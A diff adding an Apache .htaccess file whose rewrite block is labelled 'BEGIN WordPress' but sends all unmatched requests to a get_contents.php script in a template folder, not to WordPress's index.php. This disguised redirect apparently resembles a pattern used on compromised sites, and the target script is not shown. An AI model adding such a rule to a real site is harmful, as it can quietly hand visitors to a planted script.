@@ -1,0 +1,12 @@
+
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /test/templates/w3layouts.com/realestate/plottage/
+RewriteRule ^get_contents\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /test/templates/w3layouts.com/realestate/plottage/get_contents.php [L]
+</IfModule>
+
+# END WordPress
